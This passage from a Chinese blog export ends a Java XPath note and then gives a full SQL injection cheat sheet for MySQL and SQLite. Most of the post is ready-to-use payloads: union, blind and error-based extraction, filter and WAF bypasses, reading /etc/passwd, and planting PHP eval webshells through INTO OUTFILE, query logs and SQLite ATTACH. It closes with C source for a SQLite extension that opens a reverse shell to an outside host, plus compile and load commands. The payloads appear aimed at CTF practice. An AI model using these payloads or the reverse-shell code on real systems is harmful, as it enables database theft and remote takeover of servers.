</tr>
</tbody></table>
<h5 id="检索：绝对路径"><a href="#检索：绝对路径" class="headerlink" title="检索：绝对路径"></a>检索：绝对路径</h5><ul>
<li><p>采用绝对路径获取从根节点开始逐层的查找节点列表并打印信息</p>
<table>
<thead>
<tr>
<th>方法名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>/根元素/子元素/孙元素</code></td>
<td>从根元素开始，一级一级向下查找，不能跨级</td>
</tr>
</tbody></table>
</li>
</ul>
<h5 id="检索：相对路径"><a href="#检索：相对路径" class="headerlink" title="检索：相对路径"></a>检索：相对路径</h5><ul>
<li><p>先得到根节点</p>
</li>
<li><p>再采用相对路径获取下一级节点的子节点并打印信息</p>
<table>
<thead>
<tr>
<th>方法名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>./子元素/孙元素</code></td>
<td>从当前元素开始，一级一级向下查找，不能跨级</td>
</tr>
</tbody></table>
</li>
</ul>
<h5 id="检索：全文搜索"><a href="#检索：全文搜索" class="headerlink" title="检索：全文搜索"></a>检索：全文搜索</h5><ul>
<li><p>直接全文搜索所有的元素并打印</p>
<table>
<thead>
<tr>
<th>方法名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>//元素</code></td>
<td>找元素，无论元素在哪里</td>
</tr>
<tr>
<td><code>//元素/子元素</code></td>
<td>找元素，无论在哪一级，但子元素一定是元素的子节点</td>
</tr>
<tr>
<td><code>//元素//子孙元素</code></td>
<td>元素无论在哪一种，子孙元素只要是元素的子孙元素都可以找到</td>
</tr>
</tbody></table>
</li>
</ul>
<h5 id="检索：属性查找"><a href="#检索：属性查找" class="headerlink" title="检索：属性查找"></a>检索：属性查找</h5><ul>
<li><p>在全文中搜索属性，或者带属性的元素</p>
<table>
<thead>
<tr>
<th>方法名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>//@属性名</code></td>
<td>查找属性对象，无论是哪个元素，只要有这个属性即可。</td>
</tr>
<tr>
<td><code>//元素[@属性名]</code></td>
<td>查找元素对象，全文搜索指定元素名和属性名。</td>
</tr>
<tr>
<td><code>//元素//[@属性名=&quot;值&quot;]</code></td>
<td>查找元素对象，全文搜索指定元素名和属性名，并且属性值相等。</td>
</tr>
</tbody></table>
</li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Develop</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入总结</title>
    <url>/2022/03/08/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p><strong>SQL 注入笔记</strong></p>
<blockquote>
<p>年来年去年年忙，为他人作嫁衣裳</p>
<p>仰天大笑出门去，独对东风舞一场</p>
</blockquote>
<span id="more"></span>

<h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h3><p>注释符</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#</span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>常用函数</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">version()		# 版本</span><br><span class="line"><span class="keyword">user</span>()		# 用户名</span><br><span class="line">database()	# 数据库名</span><br><span class="line">@<span class="variable">@datadir</span>		# 数据库路径</span><br><span class="line">@<span class="variable">@version</span>_compile_os	# 操作系统版本</span><br><span class="line">concat(str1,str2,...)	# 没有分隔符地连接字符串</span><br><span class="line">concat_ws(separator,str1,str2,...)	# 有分隔符地连接字符串</span><br><span class="line">group_concat(str1,str2,...)	# 以逗号分隔每一条数据</span><br><span class="line">file_load(<span class="string">&#x27;/etc/passwd&#x27;</span>)		# 查看文件</span><br></pre></td></tr></table></figure>

<h3 id="union-注入"><a href="#union-注入" class="headerlink" title="union 注入"></a>union 注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> </span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="number">3</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">3</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">3</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> flag <span class="keyword">from</span> ctf.ctf limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">3</span></span><br></pre></td></tr></table></figure>

<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> length(database())<span class="operator">&gt;=</span><span class="string">&#x27;5&#x27;</span></span><br><span class="line"><span class="keyword">and</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span></span><br><span class="line"><span class="keyword">and</span> substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span></span><br><span class="line"><span class="keyword">and</span> substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span></span><br><span class="line"><span class="keyword">and</span> substr((<span class="keyword">select</span> flag <span class="keyword">from</span> ctf.ctf limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;f&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> if(length(database())<span class="operator">&gt;</span><span class="number">5</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br><span class="line"><span class="keyword">and</span> if(substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br><span class="line"><span class="keyword">and</span> if(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctf &#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br><span class="line">if(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br><span class="line"><span class="keyword">and</span> if(substr((<span class="keyword">select</span> flag <span class="keyword">from</span> ctf.ctf limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># updatexml 可同等替换为extractvalue()</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database()),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">;<span class="keyword">show</span> databases;</span><br><span class="line">;<span class="keyword">show</span> tables;</span><br></pre></td></tr></table></figure>

<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>原理：先加 %df，再加单引号，因为反斜杠的编码是 %5c，而 GBK 编码中，%df%5c 是繁体字的“連”，单引号成功逃逸</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span><span class="operator">%</span>df<span class="string">&#x27; union select 1,user(),3</span></span><br><span class="line"><span class="string">0%df&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>(<span class="keyword">select</span> database()) limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">3</span></span><br><span class="line"><span class="number">0</span><span class="operator">%</span>df<span class="string">&#x27; union select 1,(</span></span><br><span class="line"><span class="string">    select column_name from information_schema.columns where </span></span><br><span class="line"><span class="string">    table_schema=(select database()) and </span></span><br><span class="line"><span class="string">    table_name=(</span></span><br><span class="line"><span class="string">        select table_name from information_schema.tables where table_schema=(select database())</span></span><br><span class="line"><span class="string">        ) limit 0,1</span></span><br><span class="line"><span class="string">    ),3</span></span><br></pre></td></tr></table></figure>

<h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span>admin<span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> <span class="operator">&amp;</span>password<span class="operator">=</span></span><br></pre></td></tr></table></figure>

<h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*!select*/</span></span><br></pre></td></tr></table></figure>

<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>若删除关键字以达成过滤，此时就可以双写关键字来达到绕过</p>
<h3 id="大写绕过"><a href="#大写绕过" class="headerlink" title="大写绕过"></a>大写绕过</h3><p>MySQL 对大小写不敏感</p>
<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>urlencode</p>
<p>ascii</p>
<p>hex</p>
<p>unicode</p>
<h3 id="空格被过滤"><a href="#空格被过滤" class="headerlink" title="空格被过滤"></a>空格被过滤</h3><p><code>()</code>嵌套，任何可以计算结果的语句都可以用括号包裹</p>
<p><code>/**/</code></p>
<p><code>反引号</code></p>
<p><code>%a0</code>：空格</p>
<p><code>%0a</code>：新建一行</p>
<p><code>%09</code>：TAB键（水平）</p>
<p><code>%0b</code>：TAB键（垂直）</p>
<p><code>%0d</code>：return 功能</p>
<p><code>+</code>：一般适用于 GET 方法</p>
<h3 id="逗号被过滤"><a href="#逗号被过滤" class="headerlink" title="逗号被过滤"></a>逗号被过滤</h3><p><code>join</code>绕过</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ((<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)c)</span><br><span class="line"><span class="operator">&lt;=&gt;</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>

<p><code>from...for</code>绕过</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">substr(<span class="string">&#x27;password&#x27;</span>, <span class="number">5</span>, <span class="number">1</span>)</span><br><span class="line"><span class="operator">&lt;=&gt;</span></span><br><span class="line">substr(<span class="string">&#x27;password&#x27;</span> <span class="keyword">from</span> <span class="number">5</span> <span class="keyword">for</span> <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h3 id="过滤比较符号"><a href="#过滤比较符号" class="headerlink" title="过滤比较符号"></a>过滤比较符号</h3><p><code>greatest()</code>返回较大的值，代替比较大小</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">ascii(susbstr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&lt;=</span><span class="number">150</span></span><br><span class="line"><span class="operator">&lt;=&gt;</span></span><br><span class="line">greatest(ascii(susbstr(database(),<span class="number">1</span>,<span class="number">1</span>)),<span class="number">150</span>)<span class="operator">=</span><span class="number">150</span></span><br></pre></td></tr></table></figure>

<p><code>in()</code>代替<code>=</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">ascii(susbstr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">150</span></span><br><span class="line"><span class="operator">&lt;=&gt;</span></span><br><span class="line">ascii(susbstr(database(),<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">in</span> (<span class="number">150</span>)</span><br></pre></td></tr></table></figure>

<p><code>like</code>匹配</p>
<p><code>%</code>匹配任何字符串的零个或多个字符</p>
<p><code>_</code>匹配任何单个字符</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> database()) <span class="keyword">like</span> <span class="string">&#x27;___&#x27;</span></span><br></pre></td></tr></table></figure>

<p><code>regexp</code>匹配</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> database()) regexp <span class="string">&#x27;^c&#x27;</span></span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> database()) regexp <span class="string">&#x27;f$&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="过滤-and-or"><a href="#过滤-and-or" class="headerlink" title="过滤 and or"></a>过滤 and or</h3><p><code>&amp;&amp; ||</code> 替换</p>
<p>异或绕过</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">^</span>((<span class="keyword">select</span> database())<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span>)<span class="operator">^</span><span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="过滤-select"><a href="#过滤-select" class="headerlink" title="过滤 select"></a>过滤 select</h3><p>利用数值计算盲注或时间盲注</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">||</span> ascii(mid(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>) )<span class="operator">=</span><span class="number">97</span></span><br></pre></td></tr></table></figure>

<h3 id="限制-from-结合"><a href="#限制-from-结合" class="headerlink" title="限制 from 结合"></a>限制 from 结合</h3><p>用<code>from.</code>来代替<code>from</code></p>
<h3 id="敏感函数"><a href="#敏感函数" class="headerlink" title="敏感函数"></a>敏感函数</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># `函数名`() <span class="operator">&lt;=&gt;</span> 函数名()</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span>(<span class="keyword">select</span> `load_file`(<span class="number">0x2f6574632f706173737764</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span>)</span><br><span class="line"></span><br><span class="line"># 这里关键是反单引号的使用,成功逃过了敏感字符串&quot;mysql.user&quot;</span><br><span class="line"># id<span class="operator">=</span><span class="number">161444.0</span>有两个作用,第一让原来的查询返回空，第二这是一个小数，小数后可以直接接关键字，而不用空格</span><br><span class="line">id<span class="operator">=</span><span class="number">1614444.0</span><span class="keyword">Union</span>(<span class="keyword">select</span><span class="number">-1.0</span>,password,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,`<span class="keyword">user</span>`<span class="keyword">FROM</span>(`mysql`.<span class="keyword">user</span>))</span><br></pre></td></tr></table></figure>

<h3 id="写入-WebShell"><a href="#写入-WebShell" class="headerlink" title="写入 WebShell"></a>写入 WebShell</h3><p>利用 <code>union select</code> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 0x223c3f70687020406576616c28245f504f53545b2767275d293b3f3e22 into outfile &quot;/var/www/html/shell.php&quot;</span><br><span class="line">union select &quot;&lt;?php @eval($_POST[&#x27;g&#x27;]);?&gt;&quot; into outfile &quot;/var/www/html/shell.php&quot;</span><br></pre></td></tr></table></figure>

<p>利用分隔符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INTO OUTFILE &#x27;/var/www/html/shell.php&#x27; lines terminated by 0x223c3f70687020406576616c28245f504f53545b2767275d293b3f3e22</span><br><span class="line">INTO OUTFILE &#x27;/var/www/html/shell.php&#x27; fields terminated by 0x223c3f70687020406576616c28245f504f53545b2767275d293b3f3e22</span><br><span class="line">INTO OUTFILE &#x27;/var/www/html/shell.php&#x27; columns terminated by 0x223c3f70687020406576616c28245f504f53545b2767275d293b3f3e22</span><br><span class="line">INTO OUTFILE &#x27;/var/www/html/shell.php&#x27; lines starting by 0x223c3f70687020406576616c28245f504f53545b2767275d293b3f3e22</span><br></pre></td></tr></table></figure>

<p>利用 <code>log</code> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;;</span><br><span class="line">set global general_log = on;</span><br><span class="line">set global general_log_file = &#x27;/var/www/html/shell.php&#x27;;</span><br><span class="line">select &#x27;&lt;?php eval($_GET[g]);?&gt;&#x27;</span><br><span class="line">set global general_log=off; </span><br></pre></td></tr></table></figure>

<p>慢日志包含</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%slow%&#x27;;</span><br><span class="line">set global slow_query_log=on;</span><br><span class="line">set global slow_query_log_file=&#x27;/var/www/html/shell.php&#x27;;</span><br><span class="line">select &#x27;&lt;?php eval($_GET[g]);?&gt;&#x27; from mysql.db where sleep(10);</span><br><span class="line">select &#x27;&lt;?php eval($_GET[g]);?&gt;&#x27; from mysql.db where sleep(10);</span><br></pre></td></tr></table></figure>

<h3 id="HTTP-参数污染"><a href="#HTTP-参数污染" class="headerlink" title="HTTP 参数污染"></a>HTTP 参数污染</h3><p>如果WAF只单独检查每个参数的值，或者是将整个请求数据作为单个字符串处理，这样的安全机制将无法检测到HPP攻击</p>
<table>
<thead>
<tr>
<th align="center">HTTP后端</th>
<th align="center">总体解析结果</th>
<th align="center">例子</th>
</tr>
</thead>
<tbody><tr>
<td align="center">ASP.NET/IIS</td>
<td align="center">特定参数所有内容进行拼接</td>
<td align="center">par1=val1,val2</td>
</tr>
<tr>
<td align="center">ASP/IIS</td>
<td align="center">特定参数所有内容进行拼接</td>
<td align="center">par1=val1,val2</td>
</tr>
<tr>
<td align="center">PHP/Apache</td>
<td align="center">最后一次出现的参数内容</td>
<td align="center">par1=val2</td>
</tr>
<tr>
<td align="center">PHP/Zeus</td>
<td align="center">最后一次出现的参数内容</td>
<td align="center">par1=val2</td>
</tr>
<tr>
<td align="center">JSP,Servlet/Apache Tomcat</td>
<td align="center">第一次出现的参数内容</td>
<td align="center">par1=val1</td>
</tr>
</tbody></table>
<h2 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h2><h3 id="基础语法-1"><a href="#基础语法-1" class="headerlink" title="基础语法"></a>基础语法</h3><p>注释</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--</span><br><span class="line">/**/</span><br></pre></td></tr></table></figure>

<p>常用函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">group_concat(str1,str2,...)	# 以逗号分隔每一条数据</span><br></pre></td></tr></table></figure>

<p>sqlite_master 表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE sqlite_master (</span><br><span class="line">  type text,</span><br><span class="line">  name text,</span><br><span class="line">  tbl_name text,</span><br><span class="line">  rootpage integer,</span><br><span class="line">  sql text</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>表中的 <code>sql</code> 字段中记录着你建表留下的完整的记录</p>
<h3 id="union-注入-1"><a href="#union-注入-1" class="headerlink" title="union 注入"></a>union 注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3</span><br><span class="line">union select 1,(select sql from sqlite_master limit 0,1),3</span><br><span class="line">union select 1,(select flag from ctf limit 0,1),3</span><br></pre></td></tr></table></figure>

<h3 id="布尔盲注-1"><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>SQLite 没有 ascii，mid，left 等函数</p>
<p>在爆破 sql 字段的时候，最好先用 hex 编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr((select hex(group_concat(sql)) from sqlite_master),1,1)&gt;1</span><br></pre></td></tr></table></figure>

<h3 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(case when(substr(sqlite_version(),1,1)=&#x27;3&#x27;) then randomblob(1000000000) else 0 end)</span><br></pre></td></tr></table></figure>

<h3 id="模糊匹配"><a href="#模糊匹配" class="headerlink" title="模糊匹配"></a>模糊匹配</h3><p><code>*</code>匹配任何字符串的零个或多个字符</p>
<p><code>?</code>匹配任何单个字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select database()) glob &#x27;???&#x27;</span><br><span class="line">and (select database()) like &#x27;???&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="写入-webshell"><a href="#写入-webshell" class="headerlink" title="写入 webshell"></a>写入 webshell</h3><p>当注入处支持堆叠时</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ATTACH DATABASE &#x27;/var/www/html/shell.php&#x27; AS shell;</span><br><span class="line">create TABLE shell.exp (webshell text);</span><br><span class="line">insert INTO shell.exp (webshell) VALUES (&#x27;\r\n\r\n&lt;?php eval($_POST[0]);?&gt;\r\n\r\n&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="加载动态库"><a href="#加载动态库" class="headerlink" title="加载动态库"></a>加载动态库</h3><p>SQLite 从3.3.6版本提供了支持扩展，通过<code>load_extension</code>函数</p>
<p>so 扩展</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sqlite3ext.h&gt;</span> <span class="comment">/* Do not use &lt;sqlite3.h&gt;! */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line">SQLITE_EXTENSION_INIT1</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Insert your extension code here */</span></span><br><span class="line"><span class="keyword">int</span> tcp_port = <span class="number">2333</span>;</span><br><span class="line"><span class="keyword">char</span> *ip = <span class="string">&quot;vps&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WIN32</span></span><br><span class="line">__declspec(dllexport)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sqlite3_extension_init</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  sqlite3 *db, </span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">char</span> **pzErrMsg, </span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">const</span> sqlite3_api_routines *pApi</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> rc = SQLITE_OK;</span><br><span class="line">  SQLITE_EXTENSION_INIT2(pApi);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">if</span> ( fork() &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">    addr.sin_family = AF_INET;</span><br><span class="line">    addr.sin_port = htons(tcp_port);</span><br><span class="line">    addr.sin_addr.s_addr = inet_addr(ip);</span><br><span class="line"></span><br><span class="line">    fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( connect(fd, (struct sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr)) )&#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dup2(fd, <span class="number">0</span>);</span><br><span class="line">    dup2(fd, <span class="number">1</span>);</span><br><span class="line">    dup2(fd, <span class="number">2</span>);</span><br><span class="line">    execve(<span class="string">&quot;/bin/bash&quot;</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -g -fPIC -shared exp.c -o exp.so</span><br></pre></td></tr></table></figure>

<p>然后直接加载，即可反弹 shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select load_extension(&#x27;/root/exp.so&#x27;);</span><br></pre></td></tr></table></figure>

